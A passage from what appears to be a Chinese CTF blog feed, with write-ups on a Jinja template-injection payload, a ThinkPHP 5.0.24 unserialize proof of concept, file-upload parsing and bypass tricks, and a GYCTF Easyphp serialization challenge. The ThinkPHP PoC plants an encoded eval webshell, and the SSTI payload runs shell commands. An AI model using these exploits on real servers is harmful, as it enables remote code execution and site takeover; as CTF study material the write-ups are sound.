class="line">http:&#x2F;&#x2F;219.219.61.234:50007&#x2F;&quot;|attr(&quot;%c%c%c%c%c%c%c%c%c&quot;%(95,95,99,108,97,115,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c&quot;%(95,95,98,97,115,101,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(164)|attr(&quot;%c%c%c%c%c%c%c%c&quot;%(95,95,105,110,105,116,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,108,111,98,97,108,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;%c%c%c%c&quot;%(101,118,97,108))(&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,103,103,103,103,103,103,103,103,39,41,46,114,101,97,100,40,41))&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="EZ-thinkphp"><a href="#EZ-thinkphp" class="headerlink" title="EZ_thinkphp"></a>EZ_thinkphp</h3><p>扫描目录，发现源码</p><p><img src="https://i.loli.net/2020/12/26/S9rz6TGBYxalcdC.png" alt="image-20201226123828906"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// www\source\application\index\controller\index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a=@unserialize(base64_decode(<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;a&#x27;</span>)));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;thinkphp 5.0.24&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 利用点 </span></span><br></pre></td></tr></table></figure><p><a href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">参考文章</a>  直接白嫖poc :airplane:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">poc</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $selfRelation;</span><br><span class="line"><span class="keyword">protected</span> $query;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();<span class="comment">#class Query</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::__construct();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $bindAttr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::__construct();</span><br><span class="line"><span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>,<span class="string">&quot;123&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $handle = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> $styles = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//目的调用其write()</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $append = [];</span><br><span class="line"><span class="keyword">protected</span> $error;</span><br><span class="line"><span class="keyword">public</span> $parent;<span class="comment">#修改处</span></span><br><span class="line"><span class="keyword">protected</span> $selfRelation;</span><br><span class="line"><span class="keyword">protected</span> $query;</span><br><span class="line"><span class="keyword">protected</span> $aaaaa;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();<span class="comment">#Output对象,目的是调用__call()</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();<span class="comment">//Relation子类,且有getBindAttr()</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $model;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $handler = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $options = [];</span><br><span class="line"><span class="keyword">protected</span> $tag;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;tag =<span class="string">&#x27;abcdef&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="comment">//在index.php页面传入值</span></span><br><span class="line"><span class="comment">// 文件的名字是：传入内容+md5(&#x27;tag_&#x27;+md5($tag)).php 并且部分需要urlcode转码</span></span><br><span class="line"><span class="comment">// &lt;%3fcuc cucvasb()%3briny($_TRG[pzq])%3b%3f&gt;468bc8d30505000a2d7d24702b2cda94.php</span></span><br></pre></td></tr></table></figure><p>执行命令即可</p><p><img src="https://i.loli.net/2020/12/26/xjLs3Upgi8ctJKY.png" alt="image-20201226140139525"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;&lt;em&gt;WEB&lt;/em&gt;&lt;/h2&gt;&lt;h3 id=&quot;EZ-JS&quot;&gt;&lt;a href=&quot;#EZ-JS&quot; class=&quot;headerlink&quot; title=&quot;EZ_JS&quot;&gt;&lt;/a&gt;EZ_JS&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png&quot; alt=&quot;image-20201224123233716&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png&quot; alt=&quot;image-20201224123259063&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里有个好用的颜码解码网站：&lt;a href=&quot;https://www.qtool.net/decode&quot;&gt;https://www.qtool.net/decode&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>文件上传基础</title>
    <link href="http://example.com/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/</id>
    <published>2020-12-27T15:08:24.000Z</published>
    <updated>2020-12-27T15:09:41.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><blockquote><p>不是涉及的版本不是最新版……</p></blockquote><a id="more"></a><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><blockquote><p>IIS 6.0</p></blockquote><ol><li><p>IIS中的*.asa *.asp 文件夹中的文件都会被当成asp文件解析</p></li><li><p>文件为*.asp;1.jpg时会被当成ASP脚本执行</p></li><li><p>WebDav</p><blockquote><p>它是基于HTTP 1.1 协议的通信协议，它扩展了HTTP协议，添加了新的方法</p><p>打开WebDav后支持PUT Move Copy Delete </p><p>IIS Write 是一款探测WebDav漏洞的软件 </p></blockquote><ul><li><p>使用 OPTIONS 查看支持的所有方法</p></li><li><p>通过PUT上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host:www.example.com</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&lt;% …………%&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用Move 或 Copy 方法改名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COPY &#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host:www.example.com</span><br><span class="line">Destination: http:&#x2F;&#x2F;www.example.com&#x2F;cmd.adp</span><br></pre></td></tr></table></figure></li><li><p>这样就能getshell</p></li><li><p>还可以使用Delete方法删除任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE &#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host:www.example.com</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><blockquote><p>1.x  2.x</p></blockquote><p>Apache在解析文件时有一个原则：碰到不认识的扩展名时，会从后向前解析，知道碰到认识的扩展名为止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example:</span><br><span class="line">1.php.rar.xs.aa 这时就会从后往前解析，直到遇到.php</span><br></pre></td></tr></table></figure><h3 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP CGI"></a>PHP CGI</h3><blockquote><p>在php的配置文件中：cgi.fi: x_pathinfo 这个选项在某些版本中，默认是开启的，在访问URL时，如<code>www.example.com/1.txt/1.php</code></p><p>这时如果1.php不存在，则.php将会向前递归解析</p><p>该漏洞在Nginx IIS7.0  IIS7.5  Lighttpd 等web容器中容易出现</p></blockquote><p>主要利用方法就是上传合法文件名，然后进行非法解析</p><h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><ol><li><p>绕过前端javascript 过滤</p></li><li><p>绕过黑名单</p><blockquote><p>asp php  jsp  php5  asa  aspx </p></blockquote></li><li><p>修改MIME</p></li><li><p>截断上传</p><blockquote><p>将 1.asp空格xx.jpg 进入十六进制编辑器将空格的16进制数20修改为00，最后会发现上传到服务的文件变成了1.asp</p></blockquote></li><li><p>使用.htaccess   .user.ini  配置文件的绕过</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;解析漏洞&quot;&gt;&lt;a href=&quot;#解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;解析漏洞&quot;&gt;&lt;/a&gt;解析漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;不是涉及的版本不是最新版……&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="http://example.com/2020/12/21/GYCTF2020-Easyphp/"/>
    <id>http://example.com/2020/12/21/GYCTF2020-Easyphp/</id>
    <published>2020-12-21T15:33:58.000Z</published>
    <updated>2020-12-22T11:39:05.877Z</updated>
    
    <content type="html"><![CDATA[<p>考点：php序列化pop链   序列化字符串逃逸</p><blockquote><p>打开题目按照管理先扫描目录</p></blockquote><blockquote><p>使用dirsearch 扫描出来了  flag.php  login.php</p><p>使用御剑什么都没有扫出来</p><p>使用dirbuster什么都没有</p><p>这个貌似是BUU平台问题……</p></blockquote><p>打开题目</p><p><img src="https://i.loli.net/2020/12/19/vXSHu8nJyDhlE3q.png" alt="image-20201219105022481"></p><p>发现登录框，尝试弱口令登录，并且爆破用户名与密码，查看图片</p><blockquote><p>失败</p><p>查看大佬的wp，存在<a href="http://www.zip（没扫出来…………）">www.zip（没扫出来…………）</a></p></blockquote><p>查看<a href="http://www.zip,解压后查看代码/">www.zip，解压后查看代码</a></p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"></span><br><span class="line">$users=<span class="keyword">new</span> User(); <span class="comment">//创建类</span></span><br><span class="line">$users-&gt;update(); <span class="comment">// 调用user类的update函数</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// user类的update函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//调用了getNewinfo函数</span></span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    <span class="comment">//定义了一个UpdateHelper类</span></span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入点 age 与 nickname 参数可控</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="comment">//创建了一个Info类并且序列化使用safe过滤</span></span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125; <span class="comment">// 字符串替换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Info 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">    <span class="comment">// __call 中的参数，$name 需要调用的方法的名称，$arguments是一个数组，其中包含传递给方法$name的参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//此处$argument[0]就为age</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里如何触发__call()函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// user类 </span></span><br><span class="line"><span class="comment">// 把类当成字符串使用时触发，返回值需要为字符串</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里user类中调用了Info类中不存在的update函数，因此这里会自动调用__call()函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 